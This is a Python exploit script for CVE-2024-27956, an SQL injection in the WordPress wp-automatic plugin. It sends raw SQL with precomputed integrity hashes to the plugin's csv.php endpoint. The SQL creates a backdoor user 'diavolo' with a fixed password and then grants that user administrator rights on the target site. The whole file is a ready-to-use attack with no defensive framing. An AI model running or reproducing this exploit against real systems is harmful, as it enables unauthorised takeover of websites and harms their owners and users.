import requests
import sys


def makeRequest(payload, hash, url):
    host = url.split('/', 3)[2]

    headers = {
    'Host': host,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-type': 'application/x-www-form-urlencoded',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
    }

    data = {
    'q': payload,
    'auth': b'\0',
    'integ': hash
    }

    response = requests.post(url, data=data, headers=headers)
    return response


def helpUsage():
    print("[+] You must run the expoit passing the wordpress URL. \n[+] Example: python3 2024-27956.py http://website.com\nExample2: python3 2024-27956.py target_list.txt")
    quit()

def verifyArgs(argv):
    if len(sys.argv) != 2:
        helpUsage()

def execc(web):
    domain = web
    url = domain+'/wp-content/plugins/wp-automatic/inc/csv.php'

    print("[+] Creating user diavolo")
    try:
        response = makeRequest("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('diavolo', '$P$B384vNMN5un0zq/pD7e7P4HprTP3IW1', 'diavolo', 'diavolo@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'diavolo')", "c0457ffb6db4cce1280ec59578e3746b", url)
    except Exception:
        pass
    if "Tampered query" in response.text or "invalid login" in response.text or "login required" in response.text:
        print("[+] Error in the payload")
        quit()

    if "DATE" not in response.text:
        print("[+] Not vulnerable")
        quit()

    #second request (give permission)
    print("[+] Giving diavolo administrator permissions")
    try:
        makeRequest("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login = 'diavolo'), 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')", "cb972cabdff918e25183ef39b525d8a8", url)
    except Exception:
        pass
    if "Tampered query" in response.text or "invalid login" in response.text or "login required" in response.text:
        print("[+] Error in the payload")
        quit()

    print("[+] Exploit completed!")
    print("[+] administrator created: diavolo:diavolo")

verifyArgs(sys.argv)
print("[+] Exploit for CVE-2024-27956")
try:
    lists = open(sys.argv[1])
    
except Exception:
    execc(sys.argv[1])
